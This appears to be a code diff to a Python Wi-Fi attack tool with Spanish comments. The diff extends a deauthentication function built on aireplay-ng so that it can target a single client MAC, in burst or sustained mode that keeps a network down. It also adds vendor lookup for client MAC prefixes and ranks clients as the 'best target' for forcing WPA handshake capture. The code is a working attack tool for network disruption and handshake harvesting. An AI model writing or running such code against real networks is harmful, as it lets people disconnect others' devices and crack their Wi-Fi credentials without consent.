@@ -49,13 +49,17 @@ def disable_monitor(iface):
     time.sleep(0.5)
     return get_status(iface) == 'managed'
 
-def deauth(bssid, channel, count, iface, duration=0):
+def deauth(bssid, channel, count, iface, duration=0, client_mac=None):
     """Deauth en dos modos:
       - rafaga (duration=0): envia `count` rafagas y para. La red se cae
         un momento y se reconecta sola. Rapido.
       - sostenido (duration>0): envia deauth CONTINUO (--deauth 0) durante
-        `duration` segundos, manteniendo la red caida todo ese tiempo."""
+        `duration` segundos, manteniendo la red caida todo ese tiempo.
+    Si client_mac viene, el deauth es SELECTIVO a ese cliente (-c <mac>):
+    desconecta solo ese dispositivo del AP en vez de toda la red."""
     bssid = bssid.upper()  # aireplay-ng compara BSSID como string exacto, siempre en mayusculas
+    client = (client_mac or '').strip().upper()
+    target = ['-c', client] if client else []   # selectivo vs broadcast
     ok = enable_monitor(iface)
     if not ok:
         return None, f"No se pudo activar modo monitor (estado real: {get_status(iface)})"
@@ -71,11 +75,11 @@ def deauth(bssid, channel, count, iface, duration=0):
         d = int(duration)
         # Sostenido: --deauth 0 = continuo, cortado por timeout tras `d` segundos
         r = _run(['sudo', '/usr/bin/timeout', str(d), '/usr/bin/stdbuf', '-oL', '-eL',
-                  '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid, iface], timeout=d + 5)
+                  '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid] + target + [iface], timeout=d + 5)
     else:
         # Rafaga: enviar `count` rafagas y parar
         r = _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL',
-                  '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid, iface], timeout=25)
+                  '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid] + target + [iface], timeout=25)
     output = ((r.stdout or '') + (r.stderr or '')) if r else ''
 
     disable_monitor(iface)
@@ -156,6 +160,58 @@ def capture_handshake(bssid, channel, iface, capture_seconds=20, deauth_count=5,
     return has_hs, cap_file, aircrack_output
 
 
+# OUI -> fabricante. Los primeros 3 bytes del MAC identifican al fabricante.
+# Preferimos una base del sistema si existe (completa); si no, un fallback chico.
+_OUI_BUILTIN = {
+    "B827EB": "Raspberry Pi", "DCA632": "Raspberry Pi", "E45F01": "Raspberry Pi",
+    "28CDC1": "Raspberry Pi", "D83ADD": "Raspberry Pi", "2CCF67": "Raspberry Pi",
+    "F0F61C": "Apple", "A4B197": "Apple", "D0817A": "Apple", "AC87A3": "Apple",
+    "3C0754": "Apple", "F0989D": "Apple", "88665A": "Apple",
+    "FCFBFB": "Samsung", "5CF6DC": "Samsung", "8425DB": "Samsung", "E8508B": "Samsung",
+    "ECB0E1": "Xiaomi", "F8A45F": "Xiaomi", "64B473": "Xiaomi",
+    "0CB6D2": "Huawei", "48435A": "Huawei", "D4F9A1": "Huawei",
+    "503EAA": "TP-Link", "AC84C6": "TP-Link", "6466B3": "TP-Link",
+    "001A11": "Google", "F4F5E8": "Google", "3C5AB4": "Google",
+    "001565": "Intel", "A0C589": "Intel", "7C7A91": "Intel",
+}
+
+def _oui_file():
+    for p in ("/usr/share/ieee-data/oui.txt", "/var/lib/ieee-data/oui.txt",
+              "/usr/share/aircrack-ng/airodump-ng-oui.txt",
+              "/usr/share/wireshark/manuf", "/usr/share/misc/oui.txt"):
+        if os.path.exists(p):
+            return p
+    return None
+
+def _resolve_vendors(prefixes):
+    """prefixes: set de prefijos de 6 hex en MAYUSCULA sin separador.
+    Devuelve {prefijo: fabricante}. Lee el archivo del sistema una vez y
+    recolecta solo los prefijos pedidos (<=20), asi no arma todo el dict."""
+    result = {}
+    want = set(prefixes)
+    for p in want:
+        if p in _OUI_BUILTIN:
+            result[p] = _OUI_BUILTIN[p]
+    path = _oui_file()
+    if path:
+        try:
+            with open(path, "r", errors="replace") as f:
+                for line in f:
+                    m = re.match(r'^\s*([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})', line)
+                    if not m:
+                        continue
+                    pref = (m.group(1) + m.group(2) + m.group(3)).upper()
+                    if pref in want and pref not in result:
+                        rest = line[m.end():].replace('(hex)', '').strip().strip('\t').strip()
+                        vendor = re.split(r'\t|  +', rest)[0].strip() if rest else ''
+                        if vendor:
+                            result[pref] = vendor[:24]
+                    if len(result) == len(want):
+                        break
+        except Exception:
+            pass
+    return result
+
 def scan_clients(bssid, channel, iface, seconds=12):
     """Enumera los clientes (estaciones) asociados a un AP. SOLO ESCUCHA:
     corre airodump-ng filtrado por --bssid durante `seconds` (sin inyeccion)
@@ -211,6 +267,20 @@ def scan_clients(bssid, channel, iface, seconds=12):
         os.rmdir(tmpdir)
     except Exception:
         pass
+
+    # Mas activos primero (mejor objetivo para forzar reconexion/handshake)
+    def _pk(c):
+        try:
+            return int(c["packets"])
+        except (ValueError, KeyError):
+            return -1
+    clients.sort(key=_pk, reverse=True)
+
+    # Fabricante por OUI (primeros 3 bytes del MAC)
+    prefixes = {c["mac"].replace(":", "").replace("-", "").upper()[:6] for c in clients}
+    vendors = _resolve_vendors(prefixes)
+    for c in clients:
+        c["vendor"] = vendors.get(c["mac"].replace(":", "").replace("-", "").upper()[:6], "?")
 
     return clients, None
 
@@ -371,12 +441,13 @@ def main():
         count = int(sys.argv[4])
         iface_deauth = sys.argv[5] if len(sys.argv) > 5 else 'wlan1'
         duration = int(sys.argv[6]) if len(sys.argv) > 6 else 0
-        output, err = deauth(bssid, channel, count, iface_deauth, duration)
+        client_mac = sys.argv[7] if len(sys.argv) > 7 else None
+        output, err = deauth(bssid, channel, count, iface_deauth, duration, client_mac)
         if err:
-            log_attack("deauth", bssid, "fail", details=err)
+            log_attack("deauth", bssid, "fail", target_client_mac=client_mac, details=err)
             print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_deauth)}))
         else:
-            log_attack("deauth", bssid, "success", details=output)
+            log_attack("deauth", bssid, "success", target_client_mac=client_mac, details=output)
             print(json.dumps({"ok": True, "output": output, "mode": get_status(iface_deauth)}))
     elif cmd == 'handshake':
         if len(sys.argv) < 4:
